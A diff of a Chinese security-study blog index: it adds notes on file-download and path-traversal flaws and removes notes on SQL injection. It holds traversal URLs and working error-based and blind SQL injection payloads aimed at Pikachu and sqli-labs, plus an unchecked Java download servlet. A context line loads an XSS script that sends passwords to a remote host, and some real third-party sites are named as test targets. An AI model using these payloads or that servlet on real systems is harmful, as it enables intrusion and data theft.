@@ -64,6 +64,60 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-文件操作之文件下载读取" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time datetime="2021-11-11T04:52:26.000Z" itemprop="datePublished">2021-11-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/">文件操作之文件下载读取</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="文件下载，读取"><a href="#文件下载，读取" class="headerlink" title="文件下载，读取"></a>文件下载，读取</h4><p>原理，检测，利用，修复等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.文件被解析，则是文件包含漏洞</span><br><span class="line">2.显示源代码，则是文件读取漏洞</span><br><span class="line">3.提示文件下载，则是文件下载漏洞</span><br><span class="line">4.文件被删除，则是文件删除漏洞   服务器上的文件能够被删除</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>白盒测试：代码审计<br>黑盒测试：<br>1、漏扫工具<br>2、公开漏洞<br>3、手工看参数值及功能点(资源下载)</p>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>1、常见文件 - 后台首页日志等可见文件<br>2、敏感文件 - 配置文件(数据库，平台，脚本语言等)<br>        - 各种接口文件<br>       - 密钥信息等文件</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/unsafedownload/download/ai.png">http://127.0.0.1/pikachu/vul/unsafedownload/download/ai.png</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../down_nba.php">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../down_nba.php</a></p>
+<h5 id="如何去获取敏感文件"><a href="#如何去获取敏感文件" class="headerlink" title="如何去获取敏感文件"></a>如何去获取敏感文件</h5><p>1、通过扫描工具或者爬虫爬取     御剑、A7kbscan-WebPathBrute<br>2、通过读取其他文件的信息并分析其路径</p>
+<h5 id="文件下载漏洞url特点"><a href="#文件下载漏洞url特点" class="headerlink" title="文件下载漏洞url特点"></a>文件下载漏洞url特点</h5><p>文件名、参数值、目录符号<br>read.xxx?filename=<br>down.xxx?filename=<br>readfile.xxx?file=<br>downfile.xxx?file=</p>
+<p>&amp;readpath=、&amp;filepath=、&amp;path=、&amp;inputfile=、&amp;url=、&amp;data=、&amp;readfile=、&amp;menu=、META-INF= 、WEB-INF</p>
+<p>../   ..\    .\    ./  等<br>%00  ?  %23  %20 等</p>
+<h5 id="各种协议调用配合"><a href="#各种协议调用配合" class="headerlink" title="各种协议调用配合"></a>各种协议调用配合</h5><h5 id="Javaweb-文件下载代码"><a href="#Javaweb-文件下载代码" class="headerlink" title="Javaweb 文件下载代码"></a>Javaweb 文件下载代码</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p>
+<p>&lt;%@ page language=”java” import=”java.util.*” pageEncoding=”UTF-8”%&gt;<br>&lt;%<br>String path = request.getContextPath();<br>String basePath =<br>request.getScheme()+”://“+request.getServerName()+”:”+request.getServerPort()+path+”/“;<br>%&gt;</p>
+<p><a href="/download/DownloadServlet?filename=1.jpg">文件下载</a><br>public void doGet(HttpServletRequest request, HttpServletResponse response)<br>throws ServletException, IOException {<br>response.setCharacterEncoding(“UTF-8”);<br>//设置 ContentType 字段值<br>response.setContentType(“text/html;charset=utf-8”);<br>//获取所要下载的文件名称<br>String filename = request.getParameter(“filename”);<br>//下载文件所在目录<br>String folder = “/filename/“;<br>//通知浏览器以下载的方式打开response.addHeader(“Content-type”, “appllication/octet-stream”);<br>response.addHeader(“Content-Disposition”, “attachment;filename=”+filename);<br>//通知文件流读取文件<br>InputStream in = getServletContext().getResourceAsStream(folder+filename);<br>//获取 response 对象的输出流<br>OutputStream out = response.getOutputStream();<br>byte[] buffer = new byte[1024];<br>int len;<br>//循环取出流中的数据<br>while((len = in.read(buffer)) != -1){<br>out.write(buffer,0,len);</p>
+<p>}<br>}</p>
+<h4 id="涉及案例"><a href="#涉及案例" class="headerlink" title="涉及案例"></a>涉及案例</h4><p> Pikachu文件下载漏洞原理演示<br> zdns真实网站文件下载测试-功能点   <a target="_blank" rel="noopener" href="https://www.znds.com/">https://www.znds.com/</a><br> RoarCTF2019-Easy Java-文件下载读取真题复现<br>    七日情侣真实网站渗透测试   <a target="_blank" rel="noopener" href="http://www.danhaoteng.com/">http://www.danhaoteng.com</a><br> 小米路由器-文件读取真实测试-漏洞</p>
+<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a>  javaWeb文件下载代码<br><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a>  CTF考题<br><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a>   小米路由器远程任意文件读取漏洞</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckvuhge1g0014ggvje1jdc3g4" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-RCE代码命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
@@ -111,7 +165,7 @@ echo system($code);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckvl2qehy000554vjh0gs0osc" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckvuhge0p0005ggvj2zh625tt" class="article-share-link">Share</a>
       
       
     </footer>
@@ -176,7 +230,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckvl2qehn000054vjgse195du" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckvuhge0h0000ggvj2al2doa8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -224,7 +278,7 @@ curl_close($ch);
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckvl2qeih000r54vj1bhw8err" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckvuhge13000rggvjgulfhfe7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -277,7 +331,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckvl2qeig000q54vjbyh64obs" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckvuhge12000qggvj3ygj2h82" class="article-share-link">Share</a>
       
       
     </footer>
@@ -321,7 +375,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckvl2qeim000x54vjayvs8w8r" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckvuhge1e0010ggvjard2ffo7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -366,7 +420,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckvl2qeis001054vje5s9edx6" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckvuhge1f0011ggvjayepdhul" class="article-share-link">Share</a>
       
       
     </footer>
@@ -419,7 +473,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" data-id="ckvl2qeis001154vjh7d6huif" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" data-id="ckvuhge1g0013ggvjg9y24ytd" class="article-share-link">Share</a>
       
       
     </footer>
@@ -464,7 +518,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/" data-id="ckvl2qeiu001354vj0wmi2pqy" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9%AA%8C%E8%AF%81%E8%BF%87%E6%BB%A4/" data-id="ckvuhge1f0012ggvj4gkick1s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -525,66 +579,7 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/08/sql%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E6%89%A9%E5%B1%95%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/" data-id="ckvl2qeid000m54vj21iq9muw" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-sql漏洞查询方式和报错盲注" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" class="article-date">
-  <time datetime="2021-10-05T13:57:54.000Z" itemprop="datePublished">2021-10-05</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/">sql漏洞查询方式和报错盲注</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="数据库查询方式"><a href="#数据库查询方式" class="headerlink" title="数据库查询方式"></a>数据库查询方式</h4><h5 id="select-查询数据"><a href="#select-查询数据" class="headerlink" title="select 查询数据"></a>select 查询数据</h5><p>在网站应用中进行数据显示查询操作<br>例：select * from news where id=$id</p>
-<h5 id="insert-插入数据"><a href="#insert-插入数据" class="headerlink" title="insert 插入数据"></a>insert 插入数据</h5><p>在网站应用中进行用户注册添加等操作<br>例：insert into news(id,url,text) values(2,’x’,’$t’)</p>
-<h5 id="delete-删除数据"><a href="#delete-删除数据" class="headerlink" title="delete 删除数据"></a>delete 删除数据</h5><p>后台管理里面删除文章删除用户等操作<br>例：delete from news where id=$id</p>
-<h5 id="update-更新数据"><a href="#update-更新数据" class="headerlink" title="update 更新数据"></a>update 更新数据</h5><p>会员或后台中心数据同步或缓存等操作<br>例：update user set pwd=’$p’ where id=2 and username=’admin’</p>
-<p>重点理解：<br>我们可以通过以上查询方式与网站应用的关系<br>注入点产生地方或应用猜测到对方的SQL查询方式 </p>
-<h4 id="SQL注入报错盲注"><a href="#SQL注入报错盲注" class="headerlink" title="SQL注入报错盲注"></a>SQL注入报错盲注</h4><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
-<h5 id="1、基于报错的SQL盲注-报错回显"><a href="#1、基于报错的SQL盲注-报错回显" class="headerlink" title="1、基于报错的SQL盲注-报错回显"></a>1、基于报错的SQL盲注-报错回显</h5><p>floor，updatexml，extractvalue<br>原理：采用sql语句的特性使之报错回显在页面上</p>
-<h5 id="2、基于布尔的SQL盲注-逻辑判断"><a href="#2、基于布尔的SQL盲注-逻辑判断" class="headerlink" title="2、基于布尔的SQL盲注-逻辑判断"></a>2、基于布尔的SQL盲注-逻辑判断</h5><p>regexp,like,ascii,left,ord,mid<br>原理：通过sql语句逻辑判断信息内容</p>
-<h5 id="3、基于时间的SQL盲注-延时判断"><a href="#3、基于时间的SQL盲注-延时判断" class="headerlink" title="3、基于时间的SQL盲注-延时判断"></a>3、基于时间的SQL盲注-延时判断</h5><p>if,sleep<br>select if(database()=’pikachu’,123,456);<br>原理：通过响应页面时长判断信息内容</p>
-<p>192.168.80.140/sqlilabs/Less-5/?id=1’ and sleep(if(database()=’aaa’,5,0))</p>
-<p>参考：<br>like ‘ro%’                         #判断ro或ro…是否成立<br>regexp ‘^yucedu…’         #匹配yucedu及yucedu…等<br>if(条件,5,0)                       #条件成立 返回5 反之 返回0<br>sleep(5)                           #SQL语句延时执行5秒<br>mid(a,b,c)                        #从位置b(第一位从1开始算)开始，截取a字符串的c位<br>substr(a,b,c)                    #从b位置开始，截取字符串a的c个字符<br>left(database(),1)             #left(a,b)从左侧截取a的前b位<br>length(database())=8      #判断数据库database()名的长度<br>ord=ascii ascii(x)=97       #判断x的ascii码是否大于小于等于97<br>    0=48 a=97 A=65</p>
-<p>各种查询方式注入测试(报错盲注)<br>sqlilabs-less5注入测试(布尔盲注）<br>sqlilabs-less2注入测试(延时盲注）<br>网上实例演示  <a target="_blank" rel="noopener" href="http://techmart.com.hk/Coating_Services/latest_news_detail.php?id=1">http://techmart.com.hk/Coating_Services/latest_news_detail.php?id=1</a></p>
-<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h4><h5 id="pikachu-insert"><a href="#pikachu-insert" class="headerlink" title="pikachu insert"></a>pikachu insert</h5><p>username=x’ or(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ‘<br>&amp;password=admin&amp;sex=%E7%94%B7&amp;phonenum=13333333333&amp;email=fuzhou&amp;add=fujian&amp;submit=submit</p>
-<p>username=x’ or updatexml(1,concat(0x7e,(version())),0) or ‘<br>&amp;password=admin&amp;sex=%E7%94%B7&amp;phonenum=13333333333&amp;email=fuzhou&amp;add=fujian&amp;submit=submit</p>
-<p>username=x’ or extractvalue(1,concat(0x7e,database())) or ‘<br>&amp;password=admin&amp;sex=%E7%94%B7&amp;phonenum=13333333333&amp;email=fuzhou&amp;add=fujian&amp;submit=submit</p>
-<h5 id="pikachu-update"><a href="#pikachu-update" class="headerlink" title="pikachu update"></a>pikachu update</h5><p>sex=%E7%94%B7&amp;phonenum=13333333333&amp;add=hubeNicky’ or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or ‘&amp;email=fuzhou&amp;submit=submit</p>
-<p>sex=%E7%94%B7&amp;phonenum=13333333333&amp;add=hubeNicky’ or  updatexml(1,concat(0x7e,(version())),0) or ‘&amp;email=fuzhou&amp;submit=submit</p>
-<p>sex=%E7%94%B7&amp;phonenum=13333333333&amp;add=Nicky’ or extractvalue(1,concat(0x7e,database())) or ‘&amp;email=fuzhou&amp;submit=submit</p>
-<h5 id="pikachu-delete"><a href="#pikachu-delete" class="headerlink" title="pikachu delete"></a>pikachu delete</h5><p>/pikachu/vul/sqli/sqli_del.php?id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)</p>
-<p>pikachu/vul/sqli/sqli_del.php?id=56+or+updatexml+(1,concat(0x7e,database()),0)</p>
-<p>/pikachu/vul/sqli/sqli_del.php?id=56+or+extractvalue(1,concat(0x7e,database()))</p>
-<h5 id="延时盲注："><a href="#延时盲注：" class="headerlink" title="延时盲注："></a>延时盲注：</h5><p>and if(ascii(substr(database(),1,1))=115,sleep(5),1)–+<br>and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),0)–+</p>
-<h5 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h5><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a>   12种报错注入+万能语句</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/10/05/sql%E6%BC%8F%E6%B4%9E%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%92%8C%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/" data-id="ckvl2qeic000l54vjec6ihxld" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/10/08/sql%E6%BC%8F%E6%B4%9E%E6%B3%A8%E5%85%A5%E6%89%A9%E5%B1%95%E5%92%8CAccess%E6%95%B0%E6%8D%AE%E5%BA%93/" data-id="ckvuhge11000nggvjhkbs1gbd" class="article-share-link">Share</a>
       
       
     </footer>
@@ -630,6 +625,10 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
       <ul>
         
           <li>
+            <a href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/">文件操作之文件下载读取</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">RCE代码命令执行漏洞</a>
           </li>
         
@@ -643,10 +642,6 @@ echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
         
           <li>
             <a href="/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/">xss漏洞-基础分类及利用</a>
-          </li>
-        
-          <li>
-            <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传漏洞-解析漏洞</a>
           </li>
         
       </ul>
